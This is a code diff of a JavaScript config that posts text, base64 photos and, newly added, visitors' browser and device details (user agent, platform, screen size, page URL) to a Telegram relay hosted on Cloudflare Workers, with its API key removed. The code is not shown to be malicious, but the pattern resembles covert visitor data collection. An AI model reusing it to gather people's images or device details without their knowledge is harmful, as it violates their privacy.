@@ -1,39 +1,59 @@
 const Config = {
-  PIPEDREAM_URL: 'https://telegram.mustafaalomar911.workers.dev',
-  API_KEY: 'YOUR_API_KEY',
+  API_URL: "https://telegram.mustafaalomar911.workers.dev",
 
   async sendMessage(text) {
-    const response = await fetch(this.PIPEDREAM_URL, {
-      method: 'POST',
+    const res = await fetch(this.API_URL, {
+      method: "POST",
       headers: {
-        'Content-Type': 'application/json',
-        'X-API-Key': this.API_KEY
+        "Content-Type": "application/json"
       },
       body: JSON.stringify({
-        action: 'sendMessage',
-        text
+        action: "sendMessage",
+        text: text
       })
     });
 
-    const result = await response.json();
-    return result.ok;
+    return await res.json();
   },
 
-  async sendPhoto(base64, caption = '') {
-    const response = await fetch(this.PIPEDREAM_URL, {
-      method: 'POST',
+  async sendPhoto(base64, caption = "") {
+    const res = await fetch(this.API_URL, {
+      method: "POST",
       headers: {
-        'Content-Type': 'application/json',
-        'X-API-Key': this.API_KEY
+        "Content-Type": "application/json"
       },
       body: JSON.stringify({
-        action: 'sendPhoto',
+        action: "sendPhoto",
         image: base64,
-        caption
+        caption: caption
       })
     });
 
-    const result = await response.json();
-    return result.ok;
+    return await res.json();
+  },
+
+  async sendDeviceInfo(extra = {}) {
+    const res = await fetch(this.API_URL, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        action: "deviceInfo",
+        data: {
+          userAgent: navigator.userAgent,
+          language: navigator.language,
+          platform: navigator.platform,
+          screen: {
+            width: screen.width,
+            height: screen.height
+          },
+          url: location.href,
+          ...extra
+        }
+      })
+    });
+
+    return await res.json();
   }
 };
